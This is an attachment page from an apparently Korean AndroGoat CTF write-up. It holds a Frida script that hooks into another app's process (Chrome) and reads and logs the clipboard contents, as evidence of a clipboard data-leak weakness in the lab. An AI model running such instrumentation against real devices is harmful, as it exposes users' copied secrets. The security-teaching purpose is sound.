---
{"title":"read-clipboard.js","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"frida/read-clipboard.js · 사용한 Frida 스크립트 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `frida/read-clipboard.js` · 사용한 Frida 스크립트.

<pre><code>// &quot;다른 앱&quot;(여기서는 Chrome 프로세스) 안에서 클립보드를 읽어 본다
Java.perform(function () {
    Java.scheduleOnMainThread(function () {
        var app = Java.use(&quot;android.app.ActivityThread&quot;).currentApplication();
        var cm = Java.cast(app.getSystemService(&quot;clipboard&quot;), Java.use(&quot;android.content.ClipboardManager&quot;));
        var clip = cm.getPrimaryClip();
        if (clip === null) {
            console.log(&quot;[&quot; + app.getPackageName() + &quot;] getPrimaryClip() = null (접근 거부)&quot;);
        } else {
            console.log(&quot;[&quot; + app.getPackageName() + &quot;] label=&quot; + clip.getDescription().getLabel() +
                        &quot;  text=&quot; + clip.getItemAt(0).getText());
        }
    });
});
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
